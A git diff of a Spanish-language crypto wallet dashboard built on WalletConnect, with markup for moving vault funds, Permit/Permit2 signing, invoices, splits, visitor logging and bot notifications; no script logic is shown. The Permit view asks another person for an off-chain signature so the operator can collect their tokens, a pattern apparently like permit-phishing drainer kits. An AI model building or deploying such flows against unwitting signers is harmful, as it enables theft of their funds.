@@ -1,544 +1,2389 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="es">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Panel Admin - Saldos y Direcciones</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>MyPersonWallets · Panel de control</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+<!-- WalletConnect v2 — Trust mostrará la pantalla con la lista de redes -->
+<script type="module">
+  import { EthereumProvider } from 'https://esm.sh/@walletconnect/ethereum-provider@2.17.0';
+  window.WC_EthereumProvider = EthereumProvider;
+  window.dispatchEvent(new Event('wc-ready'));
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --bg: #0b1220;
-    --card: #121a2e;
-    --card-2: #0e1729;
-    --primary: #3375bb;
-    --primary-hover: #285a92;
-    --text: #e6edf7;
-    --muted: #93a4c1;
-    --border: #1f2a44;
-    --ok: #22c55e;
-    --warn: #f59e0b;
-    --err: #ef4444;
-    --gas: #f59e0b;
-  }
-  * { box-sizing: border-box; }
+  html, body { font-family:'Plus Jakarta Sans', system-ui, -apple-system, sans-serif; -webkit-font-smoothing:antialiased; color:#1e2746; }
   body {
-    margin: 0; min-height: 100vh; font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
-    background: radial-gradient(1200px 600px at 50% -10%, #1b2a4e 0%, var(--bg) 60%);
-    color: var(--text); padding: 24px;
+    background:
+      radial-gradient(1200px 700px at 80% -10%, #d6e4ff 0%, transparent 60%),
+      radial-gradient(900px 600px at -10% 100%, #e9f0ff 0%, transparent 60%),
+      linear-gradient(180deg, #f4f7ff 0%, #eaf1ff 100%);
+    min-height:100vh;
   }
-  .wrap { max-width: 1100px; margin: 0 auto; }
-  header {
-    display: flex; align-items: center; justify-content: space-between; margin-bottom: 22px; flex-wrap: wrap; gap: 12px;
+  .glass { background:rgba(255,255,255,.78); backdrop-filter:blur(14px); border:1px solid rgba(255,255,255,.9); }
+  .soft-shadow { box-shadow:0 1px 2px rgba(31,53,128,.04), 0 12px 40px -10px rgba(31,53,128,.12); }
+  .pop { box-shadow:0 8px 30px -6px rgba(96,128,255,.45); }
+  .card { border-radius:1.75rem; padding:1.5rem; }
+  .card-lg { padding:1.75rem; }
+  .field {
+    width:100%; border-radius:1rem; border:1.5px solid #e3eaff; background:#fff;
+    padding:.85rem 1rem; font-size:.95rem; color:#1e2746;
+    transition:border-color .15s, box-shadow .15s;
   }
-  header h1 { margin: 0; font-size: 22px; display: flex; align-items: center; gap: 10px; }
-  header h1 .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--err); }
-  header h1 .dot.ok { background: var(--ok); box-shadow: 0 0 10px var(--ok); }
+  .field::placeholder { color:#9aa6c4; }
+  .field:focus { outline:none; border-color:#7c9bff; box-shadow:0 0 0 4px rgba(124,155,255,.15); }
+  .btn {
+    display:inline-flex; align-items:center; justify-content:center; gap:.5rem;
+    border-radius:9999px; padding:.85rem 1.25rem; font-weight:600; font-size:.9rem;
+    transition:transform .1s, filter .15s; cursor:pointer; border:none;
+  }
+  .btn:active { transform:translateY(1px); }
+  .btn-primary { background:linear-gradient(135deg,#6691f7 0%,#7c5cff 100%); color:#fff; box-shadow:0 8px 24px -6px rgba(102,145,247,.55); }
+  .btn-primary:hover { filter:brightness(1.05); }
+  .btn-primary:disabled { opacity:.45; cursor:not-allowed; filter:grayscale(.3); }
+  .btn-soft { background:#eaf0ff; color:#3b5bdb; }
+  .btn-soft:hover { background:#dde7ff; }
+  .btn-ghost { background:transparent; color:#3b5bdb; border:1.5px solid #cfdcff; }
+  .btn-ghost:hover { background:#f4f7ff; }
+  .btn-danger { background:#fee2e2; color:#b91c1c; }
+  .btn-danger:hover { background:#fecaca; }
+  .chip { display:inline-flex; align-items:center; gap:.4rem; padding:.35rem .8rem; border-radius:9999px; background:#eaf0ff; color:#3b5bdb; font-size:.78rem; font-weight:600; }
+  .chip-ok    { background:#dcfce7; color:#15803d; }
+  .chip-warn  { background:#fef3c7; color:#a16207; }
+  .chip-bad   { background:#fee2e2; color:#b91c1c; }
+  .label { font-size:.78rem; font-weight:600; color:#6b7aa3; letter-spacing:.02em; }
+  .h-display { font-weight:800; letter-spacing:-.02em; line-height:1.1; }
+  .mono { font-family:ui-monospace,'JetBrains Mono','Menlo',monospace; }
 
-  button {
-    padding: 10px 16px; font-size: 14px; font-weight: 600; border-radius: 10px; border: none; cursor: pointer;
-    transition: background .2s, transform .05s; display: inline-flex; align-items: center; gap: 8px;
+  /* Sidebar */
+  .nav-item {
+    display:flex; align-items:center; gap:.85rem; padding:.85rem 1rem;
+    border-radius:1rem; color:#5b6791; font-weight:600; font-size:.95rem;
+    cursor:pointer; transition:background .15s, color .15s; border:1.5px solid transparent;
   }
-  button:active { transform: scale(.98); }
-  .btn-primary { background: var(--primary); color: white; }
-  .btn-primary:hover { background: var(--primary-hover); }
-  .btn-ghost { background: var(--border); color: var(--text); }
-  .btn-ghost:hover { background: #28365a; }
+  .nav-item:hover { background:#eef3ff; color:#3b5bdb; }
+  .nav-item.active { background:#fff; color:#3b5bdb; border-color:#dbe5ff; box-shadow:0 4px 14px -4px rgba(102,145,247,.25); }
+  .nav-ic {
+    width:36px; height:36px; border-radius:.75rem; display:flex; align-items:center; justify-content:center;
+    background:#eaf0ff; color:#6691f7; font-size:1.05rem; transition:background .15s, color .15s;
+  }
+  .nav-item.active .nav-ic { background:linear-gradient(135deg,#6691f7,#7c5cff); color:#fff; }
 
-  section {
-    background: var(--card); border: 1px solid var(--border); border-radius: 16px;
-    padding: 22px; margin-bottom: 18px;
-  }
-  section h2 { margin: 0 0 4px; font-size: 18px; display:flex; align-items:center; gap:8px; }
-  section .sub { color: var(--muted); font-size: 13px; margin-bottom: 14px; }
+  .view { display:none; }
+  .view.active { display:block; }
 
-  .admin-bar {
-    display:flex; flex-wrap: wrap; gap: 14px; align-items:center; justify-content: space-between;
-    background: var(--card-2); border: 1px solid var(--border); border-radius: 12px; padding: 12px 14px; margin-bottom: 18px;
+  /* Toast */
+  .toast {
+    position:fixed; bottom:1.5rem; left:50%; transform:translateX(-50%);
+    background:#1e2746; color:#fff; padding:.85rem 1.25rem; border-radius:9999px;
+    font-size:.9rem; font-weight:500; z-index:50; box-shadow:0 12px 40px -8px rgba(0,0,0,.3);
+    opacity:0; pointer-events:none; transition:opacity .25s, transform .25s;
   }
-  .admin-bar .addr { font-family: ui-monospace, Menlo, monospace; font-size: 13px; word-break: break-all; }
-  .admin-bar .meta { color: var(--muted); font-size: 12px; margin-top: 2px; }
+  .toast.show { opacity:1; transform:translateX(-50%) translateY(-4px); }
 
-  /* Tabs de redes (saldo) */
-  .tabs { display:flex; gap:6px; flex-wrap: wrap; margin-bottom: 14px; }
-  .tab {
-    padding: 8px 14px; border-radius: 8px; background: var(--border); cursor: pointer; font-size: 13px;
-    color: var(--muted); user-select:none; display:inline-flex; align-items:center; gap:8px;
+  /* Wallet modal */
+  .modal-bd { position:fixed; inset:0; background:rgba(15,23,42,.45); backdrop-filter:blur(4px); z-index:40; display:none; align-items:center; justify-content:center; padding:1rem; }
+  .modal-bd.show { display:flex; }
+  .wallet-opt {
+    display:flex; align-items:center; gap:1rem; padding:1rem 1.1rem;
+    border-radius:1.25rem; border:1.5px solid #e3eaff; background:#fff;
+    cursor:pointer; transition:border-color .15s, transform .1s; width:100%;
   }
-  .tab .ico { width:14px; height:14px; border-radius:50%; }
-  .tab.active { background: var(--primary); color:#fff; }
-  .tab.active .ico { box-shadow: 0 0 0 2px rgba(255,255,255,.5); }
+  .wallet-opt:hover { border-color:#7c9bff; transform:translateY(-1px); }
+  .wallet-icon { width:44px; height:44px; border-radius:.85rem; display:flex; align-items:center; justify-content:center; font-weight:800; color:#fff; }
 
-  /* Pestanas principales (Saldo / Direcciones) */
-  .main-tabs {
-    display:flex; gap: 4px; background: var(--card-2); border: 1px solid var(--border);
-    border-radius: 12px; padding: 4px; margin-bottom: 18px;
-  }
-  .main-tab {
-    flex: 1; text-align:center; padding: 10px 14px; border-radius: 8px; cursor: pointer;
-    font-size: 14px; font-weight: 600; color: var(--muted); user-select: none;
-    display:flex; align-items:center; justify-content:center; gap:8px;
-  }
-  .main-tab:hover { color: var(--text); }
-  .main-tab.active { background: var(--primary); color: #fff; }
-  .main-tab .badge {
-    background: rgba(255,255,255,.2); color:#fff; font-size: 11px; padding: 1px 7px; border-radius: 999px;
-  }
-  .main-tab:not(.active) .badge { background: var(--border); color: var(--muted); }
+  /* Segmented */
+  .seg { display:inline-flex; padding:.3rem; background:#eaf0ff; border-radius:9999px; }
+  .seg button { padding:.5rem 1.1rem; border-radius:9999px; font-size:.85rem; font-weight:600; color:#6b7aa3; }
+  .seg button.active { background:#fff; color:#3b5bdb; box-shadow:0 2px 8px rgba(31,53,128,.1); }
 
-  /* Tabla de saldos */
-  .balance-table { width: 100%; border-collapse: collapse; }
-  .balance-table th, .balance-table td {
-    text-align: left; padding: 12px 10px; border-bottom: 1px solid var(--border); font-size: 14px;
-  }
-  .balance-table th { color: var(--muted); font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: .5px; }
-  .balance-table td.val { text-align: right; font-family: ui-monospace, Menlo, monospace; }
-  .balance-table tr.gas td { background: rgba(245,158,11,.05); }
+  /* Status banner */
+  .status-box { padding:1rem; border-radius:1rem; font-size:.88rem; }
+  .st-info    { background:#eff6ff; color:#1e3a8a; border:1px solid #bfdbfe; }
+  .st-ok      { background:#dcfce7; color:#166534; border:1px solid #86efac; }
+  .st-err     { background:#fee2e2; color:#991b1b; border:1px solid #fca5a5; }
+  .st-pending { background:#fef3c7; color:#854d0e; border:1px solid #fde68a; }
 
-  .coin { display:flex; align-items:center; gap:10px; }
-  .coin .ico {
-    width: 30px; height: 30px; border-radius: 50%; display:flex; align-items:center; justify-content:center;
-    font-weight: 700; font-size: 11px; color: white;
-  }
-  .coin .nm { font-weight: 600; }
-  .coin .sm { color: var(--muted); font-size: 11px; }
-  .tag {
-    display:inline-block; font-size: 10px; padding: 2px 7px; border-radius: 999px; font-weight: 700;
-    background: var(--border); color: var(--muted); margin-left: 6px; vertical-align: middle;
-  }
-  .tag.gas { background: rgba(245,158,11,.18); color: var(--gas); }
-
-  /* Direcciones de deposito */
-  .deposit-grid { display: grid; gap: 14px; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); }
-  .deposit {
-    background: var(--card-2); border: 1px solid var(--border); border-radius: 12px; padding: 14px;
-    display: flex; gap: 14px; align-items: flex-start;
-  }
-  .deposit.gas { border-color: rgba(245,158,11,.4); box-shadow: 0 0 0 1px rgba(245,158,11,.15) inset; }
-  .deposit .qr { width: 110px; height: 110px; flex: 0 0 110px; background: #fff; border-radius: 8px; padding: 5px; }
-  .deposit .qr img { width: 100%; height: 100%; }
-  .deposit .info { flex: 1; min-width: 0; }
-  .deposit .net-row { display:flex; align-items:center; gap:8px; margin-bottom: 6px; flex-wrap: wrap; }
-  .deposit .net-row .ico { width: 18px; height: 18px; border-radius: 50%; }
-  .deposit .net-row .name { font-weight: 700; }
-  .deposit .gases-list { color: var(--muted); font-size: 12px; margin-bottom: 8px; }
-  .deposit .gases-list b { color: var(--gas); }
-  .deposit .addr {
-    font-family: ui-monospace, Menlo, monospace; font-size: 11px; word-break: break-all;
-    background: var(--card); padding: 8px; border-radius: 6px; border: 1px solid var(--border);
-  }
-  .deposit .actions { display:flex; gap:6px; margin-top: 8px; flex-wrap: wrap; }
-  .deposit .actions a, .deposit .actions button {
-    font-size: 12px; padding: 6px 10px; border-radius: 6px; text-decoration:none;
-  }
-
-  .pill { display:inline-block; padding: 2px 8px; border-radius:999px; font-size: 11px; font-weight:600; background: var(--border); color: var(--muted); }
-  .pill.ok { background: rgba(34,197,94,.15); color: var(--ok); }
-
-  .hidden { display: none !important; }
-  .empty { padding: 30px; text-align: center; color: var(--muted); }
-  footer { color: var(--muted); font-size: 12px; text-align: center; margin-top: 20px; }
+  .grid-2 { display:grid; grid-template-columns:1fr; gap:1.25rem; }
+  @media (min-width: 900px) { .grid-2 { grid-template-columns:1fr 1fr; } }
+  .grid-3 { display:grid; grid-template-columns:1fr; gap:1.25rem; }
+  @media (min-width: 900px) { .grid-3 { grid-template-columns:repeat(3,1fr); } }
 </style>
 </head>
 <body>
-<div class="wrap">
 
-  <header>
-    <h1><span id="dot" class="dot"></span> Panel Admin</h1>
-    <div>
-      <button id="connectBtn" class="btn-primary">Conectar TrustWallet</button>
-      <button id="disconnectBtn" class="btn-ghost hidden">Desconectar</button>
+<div class="flex min-h-screen">
+
+  <!-- ============ SIDEBAR ============ -->
+  <aside class="hidden lg:flex flex-col w-72 shrink-0 p-5 gap-2 border-r border-white/60" style="background:rgba(255,255,255,.5);backdrop-filter:blur(10px)">
+    <div class="flex items-center gap-3 px-2 py-3">
+      <div style="width:42px;height:42px;border-radius:1rem;background:linear-gradient(135deg,#6691f7,#7c5cff);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800">M</div>
+      <div>
+        <div class="font-bold text-lg leading-tight">MyPersonWallets</div>
+        <div class="text-xs text-slate-500">Tu bóveda personal</div>
+      </div>
     </div>
-  </header>
 
-  <div id="notConnected" class="empty" style="background:var(--card);border:1px solid var(--border);border-radius:14px">
-    <h2 style="margin:0 0 6px">Sin conexion</h2>
-    <p style="margin:0">Pulsa <b>Conectar TrustWallet</b>. Se abrira un QR (escritorio) o tu wallet directamente (movil).</p>
-  </div>
+    <nav class="mt-4 flex flex-col gap-1.5" id="nav">
+      <a class="nav-item active" data-view="home">
+        <div class="nav-ic">🏠</div>
+        <div><div>Inicio</div><div class="text-[11px] text-slate-400 font-normal">Resumen general</div></div>
+      </a>
+      <a class="nav-item" data-view="move">
+        <div class="nav-ic">↗</div>
+        <div><div>Mover</div><div class="text-[11px] text-slate-400 font-normal">Retirar fondos</div></div>
+      </a>
+      <a class="nav-item" data-view="permit">
+        <div class="nav-ic">✍</div>
+        <div><div>Permit</div><div class="text-[11px] text-slate-400 font-normal">Firmar autorizaciones</div></div>
+      </a>
+      <a class="nav-item" data-view="charge">
+        <div class="nav-ic">🧾</div>
+        <div><div>Cobrar</div><div class="text-[11px] text-slate-400 font-normal">Crear invoices</div></div>
+      </a>
+      <a class="nav-item" data-view="splits">
+        <div class="nav-ic">🔀</div>
+        <div><div>Splits</div><div class="text-[11px] text-slate-400 font-normal">Dividir fondos</div></div>
+      </a>
+      <a class="nav-item" data-view="wallets">
+        <div class="nav-ic">🗂</div>
+        <div><div>Mis Wallets</div><div class="text-[11px] text-slate-400 font-normal">SC + destino por red</div></div>
+      </a>
+      <a class="nav-item" data-view="owner">
+        <div class="nav-ic">🛡</div>
+        <div><div>Owner</div><div class="text-[11px] text-slate-400 font-normal">Gobernanza</div></div>
+      </a>
+      <a class="nav-item" data-view="activity">
+        <div class="nav-ic">🔔</div>
+        <div><div>Actividad</div><div class="text-[11px] text-slate-400 font-normal">Visitas · log eventos</div></div>
+      </a>
+      <a class="nav-item" data-view="config">
+        <div class="nav-ic">⚙</div>
+        <div><div>Configuración</div><div class="text-[11px] text-slate-400 font-normal">Bots · notificaciones</div></div>
+      </a>
+    </nav>
 
-  <div id="dashboard" class="hidden">
+    <div class="mt-auto card glass soft-shadow" style="padding:1rem">
+      <div class="label mb-1">Recordatorio</div>
+      <p class="text-xs text-slate-600 leading-relaxed">Sos vos quien firma todo. Tus llaves nunca tocan esta página.</p>
+    </div>
+  </aside>
 
-    <!-- barra superior admin -->
-    <div class="admin-bar">
-      <div style="min-width:0">
-        <div class="addr" id="adminAddr">-</div>
-        <div class="meta">
-          <span id="netName">-</span> &middot; chainId <span id="chainId">-</span>
-          &middot; <span id="source" class="pill">-</span>
+  <!-- ============ MAIN ============ -->
+  <main class="flex-1 min-w-0 p-6 md:p-8 max-w-[1200px]">
+
+    <!-- TOP BAR -->
+    <header class="flex items-center justify-between mb-7 gap-3 flex-wrap">
+      <div>
+        <div class="text-xs uppercase tracking-wider text-slate-500 font-semibold">Panel</div>
+        <h1 id="pageTitle" class="h-display text-2xl mt-0.5">Inicio</h1>
+      </div>
+      <div class="flex items-center gap-2">
+        <span id="netChip" class="chip">⛓ <span id="netName">No conectado</span></span>
+        <span id="addrChip" class="chip hidden mono">👤 <span id="addrShort">—</span></span>
+        <button id="connectBtn" class="btn btn-primary text-sm" onclick="openWalletModal()">Conectar wallet</button>
+        <button id="disconnectBtn" class="btn btn-ghost text-sm hidden" onclick="disconnect()">Salir</button>
+      </div>
+    </header>
+
+    <!-- =========================================== -->
+    <!-- VIEW: HOME                                   -->
+    <!-- =========================================== -->
+    <section class="view active" data-view="home">
+
+      <div id="heroBlock" class="card glass soft-shadow text-center mb-6" style="padding:3rem 2rem">
+        <div class="text-5xl mb-3">👋</div>
+        <h2 class="h-display text-3xl mb-2">Bienvenido</h2>
+        <p class="text-slate-600 max-w-md mx-auto mb-5">Conectá tu wallet (Trust, MetaMask, etc.) y empezá a controlar tu <strong class="text-indigo-600">AssetVault</strong>.</p>
+        <button class="btn btn-primary mx-auto" onclick="openWalletModal()" style="padding:1rem 2rem;font-size:1rem">Conectar wallet</button>
+      </div>
+
+      <div id="homeConnected" class="hidden space-y-5">
+        <!-- BALANCE -->
+        <div class="card card-lg pop" style="background:linear-gradient(135deg,#6691f7 0%,#7c5cff 100%); color:#fff">
+          <div class="flex items-start justify-between flex-wrap gap-3">
+            <div>
+              <div class="text-white/70 text-sm font-medium">Saldo en tu bóveda</div>
+              <div class="flex items-baseline gap-2 mt-1">
+                <span id="vaultEthBal" class="h-display text-4xl">—</span>
+                <span class="text-white/80 font-semibold">ETH</span>
+              </div>
+            </div>
+            <button class="btn" style="background:rgba(255,255,255,.2);color:#fff;font-size:.85rem" onclick="refreshBalance()">↻ Actualizar</button>
+          </div>
+          <div class="mt-5 pt-5 border-t border-white/20 flex items-center justify-between flex-wrap gap-3 text-sm">
+            <div>
+              <div class="text-white/60 text-xs uppercase tracking-wider">Tu wallet</div>
+              <div id="meAddr" class="font-semibold mono mt-0.5">—</div>
+            </div>
+            <div class="text-right">
+              <div class="text-white/60 text-xs uppercase tracking-wider">Bóveda</div>
+              <div id="vaultAddrShort" class="font-semibold mono mt-0.5">—</div>
+            </div>
+          </div>
+          <div id="ownerBadge"    class="hidden mt-4 inline-flex items-center gap-2 bg-white/15 rounded-full px-3 py-1 text-xs font-semibold">✓ Sos el owner</div>
+          <div id="notOwnerBadge" class="hidden mt-4 inline-flex items-center gap-2 bg-red-500/30 rounded-full px-3 py-1 text-xs font-semibold">✕ No sos el owner</div>
+        </div>
+
+        <!-- Chain switcher -->
+        <div class="card glass soft-shadow">
+          <div class="flex items-start justify-between gap-3 flex-wrap">
+            <div>
+              <div class="label">Red activa</div>
+              <div class="text-sm text-slate-600 mt-1">Cambiá entre las redes donde tengas tu bóveda desplegada.</div>
+            </div>
+          </div>
+          <div id="chainSwitcher" class="flex flex-wrap gap-1.5 mt-3"></div>
+        </div>
+
+        <!-- ADDRESS BOOK -->
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-start justify-between flex-wrap gap-3 mb-4">
+            <div>
+              <h3 class="h-display text-xl">Mis direcciones de depósito</h3>
+              <p class="text-xs text-slate-500 mt-1">Donde vas a recibir los fondos cuando los muevas. Se guardan en este navegador.</p>
+            </div>
+            <button class="btn btn-soft text-xs" style="padding:.5rem .9rem" onclick="copyAllAddresses()">📋 Copiar todas</button>
+          </div>
+
+          <!-- EVM (auto desde wallet conectada) -->
+          <div class="mb-5">
+            <div class="flex items-center justify-between mb-2">
+              <div class="label">Redes EVM · misma dirección para las 6</div>
+              <button class="text-[11px] text-indigo-600 font-semibold hover:text-indigo-800" onclick="useEvmAsDest()">↗ Usar como destino</button>
+            </div>
+            <div class="flex items-center gap-2 p-3 rounded-2xl" style="background:linear-gradient(135deg,#eef3ff,#f5f0ff);border:1px solid #dbe5ff">
+              <div class="flex-1 mono text-sm break-all" id="evmAddrDisplay">— Conectá tu wallet —</div>
+              <button class="btn btn-soft text-xs" style="padding:.45rem .7rem" onclick="copyEvmAddr()">📋</button>
+            </div>
+            <div id="evmChainsBadges" class="flex flex-wrap gap-1.5 mt-2"></div>
+          </div>
+
+          <!-- No-EVM (manual) -->
+          <div>
+            <div class="label mb-2">Otras redes · pegá desde Trust → Recibir</div>
+            <div id="otherChainsGrid" class="grid grid-cols-1 md:grid-cols-2 gap-2.5"></div>
+          </div>
+        </div>
+
+        <!-- VAULT CONFIG -->
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-start gap-3 flex-wrap">
+            <div class="flex-1 min-w-[200px]">
+              <div class="label mb-1.5">Dirección de tu AssetVault</div>
+              <input id="vaultInput" class="field mono text-sm" placeholder="0x… address devuelta por el deploy"/>
+              <div class="text-xs text-slate-500 mt-1.5">Se guarda en este navegador.</div>
+            </div>
+            <button class="btn btn-soft mt-7" onclick="saveVault()">Guardar</button>
+          </div>
+        </div>
+
+        <!-- QUICK ACTIONS -->
+        <div class="grid-3">
+          <a class="card glass soft-shadow cursor-pointer hover:scale-[1.02] transition" onclick="goto('move')">
+            <div class="nav-ic" style="width:44px;height:44px;background:linear-gradient(135deg,#6691f7,#7c5cff);color:#fff;font-size:1.2rem">↗</div>
+            <h3 class="font-bold text-lg mt-3">Mover fondos</h3>
+            <p class="text-sm text-slate-500 mt-1">Retirá ETH o ERC-20 a cualquier wallet</p>
+          </a>
+          <a class="card glass soft-shadow cursor-pointer hover:scale-[1.02] transition" onclick="goto('charge')">
+            <div class="nav-ic" style="width:44px;height:44px;background:linear-gradient(135deg,#34d399,#10b981);color:#fff;font-size:1.2rem">🧾</div>
+            <h3 class="font-bold text-lg mt-3">Crear invoice</h3>
+            <p class="text-sm text-slate-500 mt-1">Cobrale a alguien en ETH o ERC-20</p>
+          </a>
+          <a class="card glass soft-shadow cursor-pointer hover:scale-[1.02] transition" onclick="goto('splits')">
+            <div class="nav-ic" style="width:44px;height:44px;background:linear-gradient(135deg,#fbbf24,#f59e0b);color:#fff;font-size:1.2rem">🔀</div>
+            <h3 class="font-bold text-lg mt-3">Splits</h3>
+            <p class="text-sm text-slate-500 mt-1">Dividir entre varios destinos</p>
+          </a>
         </div>
       </div>
-      <div style="display:flex;gap:8px;flex-wrap:wrap">
-        <button class="btn-ghost" id="copyAddr">Copiar</button>
-        <button class="btn-ghost" id="explorerBtn">Explorer</button>
-        <button class="btn-ghost" id="refreshBtn">Refrescar</button>
-      </div>
-    </div>
-
-    <!-- Pestanas principales -->
-    <div class="main-tabs" id="mainTabs">
-      <div class="main-tab active" data-view="balance">Saldo</div>
-      <div class="main-tab" data-view="addresses">Direcciones <span class="badge" id="netCount">0</span></div>
-    </div>
-
-    <!-- VISTA: SALDO -->
-    <section id="viewBalance">
-      <h2>Saldo de la billetera</h2>
-      <div class="sub">Saldos en la red seleccionada. La moneda de <b style="color:var(--gas)">gas</b> esta resaltada.</div>
-
-      <div class="tabs" id="balanceTabs"></div>
-
-      <table class="balance-table">
-        <thead>
-          <tr>
-            <th>Moneda</th>
-            <th style="text-align:right">Saldo</th>
-          </tr>
-        </thead>
-        <tbody id="balanceBody">
-          <tr><td colspan="2" class="empty">Cargando...</td></tr>
-        </tbody>
-      </table>
     </section>
 
-    <!-- VISTA: DIRECCIONES -->
-    <section id="viewAddresses" class="hidden">
-      <h2>Direcciones de deposito</h2>
-      <div class="sub">
-        En cada red, tu direccion EVM recibe la <b style="color:var(--gas)">moneda de gas</b> y todos los tokens ERC20 de esa red.
-        <b>Importante:</b> el deposito debe hacerse en la red correcta o los fondos se pierden.
+    <!-- =========================================== -->
+    <!-- VIEW: MOVE                                   -->
+    <!-- =========================================== -->
+    <section class="view" data-view="move">
+      <div class="card card-lg glass soft-shadow">
+        <div class="flex items-center justify-between mb-5 flex-wrap gap-3">
+          <div>
+            <h2 class="h-display text-2xl">Mover fondos</h2>
+            <p class="text-slate-500 text-sm mt-1">Enviá ETH o ERC-20 desde tu bóveda a otra dirección.</p>
+          </div>
+          <div class="seg">
+            <button id="tabEth" class="active" onclick="setTab('eth')">ETH</button>
+            <button id="tabErc" onclick="setTab('erc')">ERC-20</button>
+          </div>
+        </div>
+
+        <div id="ercTokenWrap" class="hidden mb-4">
+          <label class="label">Token ERC-20</label>
+          <input id="tokenAddr" class="field mono mt-1.5" placeholder="0x… address del token"/>
+        </div>
+
+        <label class="label">Destino</label>
+        <input id="toAddr" class="field mono mt-1.5" placeholder="0x… wallet de destino"/>
+
+        <div class="mt-4">
+          <div class="flex items-center justify-between">
+            <label class="label">Monto</label>
+            <button class="text-xs font-semibold text-indigo-600 hover:text-indigo-800" onclick="setMax()">Usar todo</button>
+          </div>
+          <div class="relative mt-1.5">
+            <input id="amount" class="field mono pr-20" placeholder="0.0" inputmode="decimal"/>
+            <span id="amountUnit" class="absolute right-5 top-1/2 -translate-y-1/2 text-slate-400 font-semibold text-sm">ETH</span>
+          </div>
+        </div>
+
+        <button id="sendBtn" class="btn btn-primary w-full mt-6" onclick="doSend()" disabled>
+          <span id="sendLabel">Enviar</span>
+        </button>
+
+        <div id="txStatus" class="hidden mt-4"></div>
       </div>
-      <div class="deposit-grid" id="depositGrid"></div>
     </section>
 
-  </div>
+    <!-- =========================================== -->
+    <!-- VIEW: PERMIT                                 -->
+    <!-- =========================================== -->
+    <section class="view" data-view="permit">
+      <div class="card card-lg glass soft-shadow mb-5">
+        <h2 class="h-display text-2xl">Permit & Permit2</h2>
+        <p class="text-slate-500 text-sm mt-1 max-w-2xl">
+          Pedile a alguien una firma off-chain para autorizar el cobro sin que tenga que mandar transacciones.
+        </p>
+      </div>
 
-  <footer>
-    Conexion via WalletConnect v2 (gratuita). Sin backend.
-  </footer>
+      <div class="grid-2">
+        <!-- EIP-2612 -->
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-center gap-3 mb-3">
+            <div class="nav-ic" style="width:38px;height:38px;background:linear-gradient(135deg,#34d399,#10b981);color:#fff">✍</div>
+            <div>
+              <div class="label">Firma</div>
+              <h3 class="h-display text-xl">EIP-2612</h3>
+            </div>
+          </div>
+          <div class="space-y-3">
+            <div><label class="label">Token (con permit)</label><input class="field mono mt-1.5" placeholder="0x…"/></div>
+            <div class="grid grid-cols-2 gap-3">
+              <div><label class="label">Monto</label><input class="field mono mt-1.5" placeholder="0.0"/></div>
+              <div><label class="label">Vence (min)</label><input class="field mono mt-1.5" value="60"/></div>
+            </div>
+          </div>
+          <div class="mt-5 flex gap-2">
+            <button class="btn btn-soft flex-1">1) Firmar</button>
+            <button class="btn btn-primary flex-1">2) Cobrar</button>
+          </div>
+          <div class="mt-4 p-3 rounded-xl bg-slate-50 border border-slate-200 mono text-[11px] text-slate-600 break-all">
+            <div><span class="text-indigo-600 font-bold">v:</span> —</div>
+            <div><span class="text-indigo-600 font-bold">r:</span> —</div>
+            <div><span class="text-indigo-600 font-bold">s:</span> —</div>
+          </div>
+        </div>
+
+        <!-- Permit2 -->
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-center gap-3 mb-3">
+            <div class="nav-ic" style="width:38px;height:38px;background:linear-gradient(135deg,#a78bfa,#7c3aed);color:#fff">✍</div>
+            <div>
+              <div class="label">Firma</div>
+              <h3 class="h-display text-xl">Permit2</h3>
+            </div>
+          </div>
+          <div class="space-y-3">
+            <div><label class="label">Token</label><input class="field mono mt-1.5" placeholder="0x…"/></div>
+            <div class="grid grid-cols-3 gap-3">
+              <div><label class="label">Monto</label><input class="field mono mt-1.5" placeholder="0.0"/></div>
+              <div><label class="label">Decimales</label><input class="field mono mt-1.5" value="18"/></div>
+              <div><label class="label">Vence (min)</label><input class="field mono mt-1.5" value="60"/></div>
+            </div>
+            <div><label class="label">Nonce</label><input class="field mono mt-1.5" placeholder="cualquier número no usado"/></div>
+          </div>
+          <div class="mt-5 flex gap-2">
+            <button class="btn btn-soft flex-1">1) Firmar</button>
+            <button class="btn btn-primary flex-1">2) Cobrar</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="mt-5 card glass soft-shadow text-sm text-slate-600" style="padding:1.25rem">
+        <strong class="text-indigo-700">Permit2 canónico:</strong> <span class="mono text-xs">0x000000000022D473030F116dDEE9F6B43aC78BA3</span> — mismo en todas las EVM principales.
+      </div>
+    </section>
+
+    <!-- =========================================== -->
+    <!-- VIEW: CHARGE                                 -->
+    <!-- =========================================== -->
+    <section class="view" data-view="charge">
+      <div class="card card-lg glass soft-shadow mb-5">
+        <h2 class="h-display text-2xl">Cobrar (Invoices)</h2>
+        <p class="text-slate-500 text-sm mt-1 max-w-2xl">
+          Creá facturas on-chain. El pagador las puede saldar directamente o vos podés tirar con su firma.
+        </p>
+      </div>
+
+      <div class="grid-2">
+        <div class="card card-lg glass soft-shadow">
+          <div class="flex items-center gap-3 mb-3">
+            <div class="nav-ic" style="width:38px;height:38px;background:linear-gradient(135deg,#34d399,#10b981);color:#fff">＋</div>
+            <div>
+              <div class="label">Crear</div>
+              <h3 class="h-display text-xl">Nueva invoice</h3>
+            </div>
+          </div>
+          <div class="space-y-3">
+            <div>
+              <label class="label">ID / Etiqueta</label>
+              <input class="field mono mt-1.5" placeholder="ej: factura-001"/>
+            </div>
+            <div>
+              <label class="label">Token (vacío = ETH)</label>
+              <input class="field mono mt-1.5" placeholder="ETH o 0x…"/>
+            </div>
